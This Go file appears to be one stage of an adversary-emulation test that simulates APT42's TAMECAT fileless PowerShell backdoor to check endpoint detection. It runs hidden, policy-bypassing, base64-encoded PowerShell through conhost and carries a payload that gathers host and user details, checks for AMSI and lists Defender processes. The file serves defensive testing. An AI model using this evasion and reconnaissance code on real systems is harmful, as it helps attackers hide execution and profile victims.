//go:build windows

/*
STAGE 2: Command and Scripting Interpreter - PowerShell (T1059.001)
Simulates TAMECAT fileless backdoor deployment via in-memory PowerShell execution.
Tests EDR detection of PowerShell executing from conhost context with encoded commands.
*/

package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf16"
)

const (
	TEST_UUID      = "92b0b4f6-a09b-4c7b-b593-31ce461f804c"
	TECHNIQUE_ID   = "T1059.001"
	TECHNIQUE_NAME = "TAMECAT PowerShell Backdoor"
	STAGE_ID       = 2
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting TAMECAT fileless PowerShell backdoor simulation")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Fileless TAMECAT backdoor via in-memory PowerShell")

	if err := performTechnique(); err != nil {
		errStr := strings.ToLower(err.Error())
		if strings.Contains(errStr, "access denied") ||
			strings.Contains(errStr, "blocked") ||
			strings.Contains(errStr, "prevented") ||
			strings.Contains(errStr, "is not recognized") ||
			strings.Contains(errStr, "disabled") ||
			strings.Contains(errStr, "script") {
			fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}

		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, "TAMECAT backdoor simulation completed - fileless execution achieved")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Fileless PowerShell execution from conhost context succeeded")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	targetDir := "c:\\F0"

	// Step 1: Create TAMECAT-style PowerShell payload (benign simulation)
	fmt.Printf("[STAGE %s] Preparing TAMECAT fileless PowerShell payload...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Creating TAMECAT-style PowerShell payload for in-memory execution")

	// TAMECAT loader behavior: base64-encoded PowerShell that runs in memory
	// This simulates the TAMECAT pattern without malicious functionality
	psScript := createTAMECATPayload()

	// Step 2: Encode PowerShell command (TAMECAT uses -EncodedCommand)
	encodedCmd := encodePS(psScript)
	fmt.Printf("[STAGE %s] Encoded PowerShell command: %d chars\n", TECHNIQUE_ID, len(encodedCmd))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Encoded command prepared: %d characters", len(encodedCmd)))

	// Step 3: Execute via conhost.exe -> powershell.exe chain (TAMECAT pattern)
	// APT42 uses conhost.exe to spawn PowerShell to evade detection
	fmt.Printf("[STAGE %s] Executing TAMECAT payload via conhost -> powershell chain...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Executing via conhost.exe -> powershell.exe (TAMECAT execution pattern)")

	// Method 1: Direct PowerShell with -EncodedCommand (primary TAMECAT technique)
	cmd := exec.Command("conhost.exe",
		"--headless",
		"powershell.exe",
		"-NoProfile",
		"-NonInteractive",
		"-WindowStyle", "Hidden",
		"-ExecutionPolicy", "Bypass",
		"-EncodedCommand", encodedCmd,
	)

	output, err := cmd.CombinedOutput()
	outStr := string(output)

	if err != nil {
		fmt.Printf("[STAGE %s] conhost->powershell execution result: %v\nOutput: %s\n", TECHNIQUE_ID, err, outStr)

		// Check if blocked by AMSI, Defender, or execution policy
		if strings.Contains(strings.ToLower(outStr), "script") ||
			strings.Contains(strings.ToLower(outStr), "blocked") ||
			strings.Contains(strings.ToLower(outStr), "malicious") ||
			strings.Contains(strings.ToLower(outStr), "amsi") {
			return fmt.Errorf("PowerShell execution blocked by AMSI/Defender: %s", outStr)
		}

		// conhost --headless may not be available on all Windows versions
		// Fall back to direct PowerShell execution
		LogMessage("WARN", TECHNIQUE_ID, "conhost --headless not available, falling back to direct PowerShell")
		fmt.Printf("[STAGE %s] Falling back to direct PowerShell execution...\n", TECHNIQUE_ID)

		cmd2 := exec.Command("powershell.exe",
			"-NoProfile",
			"-NonInteractive",
			"-WindowStyle", "Hidden",
			"-ExecutionPolicy", "Bypass",
			"-EncodedCommand", encodedCmd,
		)
		output, err = cmd2.CombinedOutput()
		outStr = string(output)

		if err != nil {
			fmt.Printf("[STAGE %s] Direct PowerShell result: %v\nOutput: %s\n", TECHNIQUE_ID, err, outStr)
			if strings.Contains(strings.ToLower(outStr), "blocked") ||
				strings.Contains(strings.ToLower(outStr), "malicious") ||
				strings.Contains(strings.ToLower(outStr), "amsi") ||
				strings.Contains(strings.ToLower(outStr), "not recognized") {
				return fmt.Errorf("PowerShell execution blocked: %v - %s", err, outStr)
			}
			// Non-blocking error may be acceptable (e.g., partial output)
			LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("PowerShell returned non-zero but may have partially executed: %v", err))
		}
	}

	// Save PowerShell output
	outputPath := filepath.Join(targetDir, "tamecat_output.txt")
	os.WriteFile(outputPath, output, 0644)
	fmt.Printf("[STAGE %s] TAMECAT output saved to: %s\n", TECHNIQUE_ID, outputPath)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("TAMECAT output saved: %s (%d bytes)", outputPath, len(output)))

	// Step 4: Verify in-memory execution artifacts
	fmt.Printf("[STAGE %s] Verifying TAMECAT execution artifacts...\n", TECHNIQUE_ID)

	// Check if the TAMECAT marker file was created (indicates in-memory execution succeeded)
	markerPath := filepath.Join(targetDir, "tamecat_beacon.dat")
	if _, err := os.Stat(markerPath); err == nil {
		fmt.Printf("[STAGE %s] TAMECAT beacon marker found - in-memory execution confirmed\n", TECHNIQUE_ID)
		LogMessage("INFO", TECHNIQUE_ID, "TAMECAT beacon marker confirmed - fileless execution succeeded")
	} else {
		fmt.Printf("[STAGE %s] TAMECAT beacon marker not found - execution may have been partially blocked\n", TECHNIQUE_ID)
		LogMessage("WARN", TECHNIQUE_ID, "TAMECAT beacon marker not found - possible partial blocking")
	}

	// Step 5: Secondary in-memory execution test (IEX pattern used by TAMECAT)
	fmt.Printf("[STAGE %s] Testing secondary IEX in-memory pattern...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Testing IEX (Invoke-Expression) in-memory pattern")

	iexScript := "$env:TAMECAT_STAGE='active'; [System.IO.File]::WriteAllText('c:\\F0\\tamecat_iex_marker.txt', \"IEX_EXECUTION=$(Get-Date -Format o)`nPID=$PID`nPATH=$($env:PATH.Substring(0,100))\")"
	cmd3 := exec.Command("powershell.exe",
		"-NoProfile",
		"-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-Command", iexScript,
	)
	iexOutput, iexErr := cmd3.CombinedOutput()
	if iexErr != nil {
		fmt.Printf("[STAGE %s] IEX execution result: %v\n", TECHNIQUE_ID, iexErr)
		LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("IEX execution returned: %v", iexErr))
	} else {
		fmt.Printf("[STAGE %s] IEX execution succeeded\n", TECHNIQUE_ID)
		LogMessage("INFO", TECHNIQUE_ID, "IEX in-memory execution succeeded")
	}

	_ = iexOutput

	time.Sleep(2 * time.Second)

	fmt.Printf("[STAGE %s] TAMECAT fileless backdoor simulation complete\n", TECHNIQUE_ID)
	return nil
}

// createTAMECATPayload creates a benign PowerShell script that mimics TAMECAT behavior
func createTAMECATPayload() string {
	return `
# TAMECAT Backdoor Simulation - F0RT1KA Security Test
# This simulates TAMECAT loader behavior for detection validation
# NO malicious functionality - benign simulation only

$ErrorActionPreference = 'SilentlyContinue'

# Phase 1: Environment fingerprinting (TAMECAT reconnaissance)
$sysInfo = @{
    'Hostname' = $env:COMPUTERNAME
    'Username' = $env:USERNAME
    'Domain' = $env:USERDOMAIN
    'OS' = [System.Environment]::OSVersion.VersionString
    'Architecture' = [System.Environment]::Is64BitOperatingSystem
    'PSVersion' = $PSVersionTable.PSVersion.ToString()
    'CLR' = [System.Environment]::Version.ToString()
    'PID' = $PID
    'IntegrityLevel' = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Phase 2: AMSI detection check (TAMECAT checks if AMSI is active)
$amsiLoaded = $false
try {
    $amsiDll = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Location -like '*amsi*' }
    if ($amsiDll) { $amsiLoaded = $true }
} catch {}

$sysInfo['AMSILoaded'] = $amsiLoaded

# Phase 3: Defender process enumeration
$defenderProcs = Get-Process -Name 'MsMpEng','MsSense','SenseIR','SenseCncProxy' -ErrorAction SilentlyContinue
$sysInfo['DefenderProcesses'] = ($defenderProcs | Select-Object -ExpandProperty Name) -join ','

# Phase 4: Network interface enumeration (C2 routing decision)
$netInterfaces = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Select-Object IPAddress, InterfaceAlias
$sysInfo['NetworkInterfaces'] = ($netInterfaces | ForEach-Object { "$($_.InterfaceAlias):$($_.IPAddress)" }) -join ';'

# Phase 5: Create beacon marker (simulates C2 check-in)
$beaconData = @{
    'timestamp' = (Get-Date -Format 'o')
    'beacon_id' = [guid]::NewGuid().ToString()
    'stage' = 'TAMECAT_LOADER'
    'system_info' = $sysInfo
}
$beaconJson = $beaconData | ConvertTo-Json -Depth 3
[System.IO.File]::WriteAllText('c:\F0\tamecat_beacon.dat', $beaconJson)

# Output summary
Write-Output "[TAMECAT] Fileless execution active"
Write-Output "[TAMECAT] PID: $PID"
Write-Output "[TAMECAT] AMSI Status: $(if($amsiLoaded){'DETECTED'}else{'NOT_DETECTED'})"
Write-Output "[TAMECAT] Defender Processes: $($sysInfo['DefenderProcesses'])"
Write-Output "[TAMECAT] Beacon marker written to c:\F0\tamecat_beacon.dat"
`
}

// encodePS encodes a PowerShell script to UTF-16LE base64 for -EncodedCommand
func encodePS(script string) string {
	// Convert to UTF-16LE
	runes := utf16.Encode([]rune(script))
	bytes := make([]byte, len(runes)*2)
	for i, r := range runes {
		bytes[i*2] = byte(r)
		bytes[i*2+1] = byte(r >> 8)
	}
	return base64.StdEncoding.EncodeToString(bytes)
}
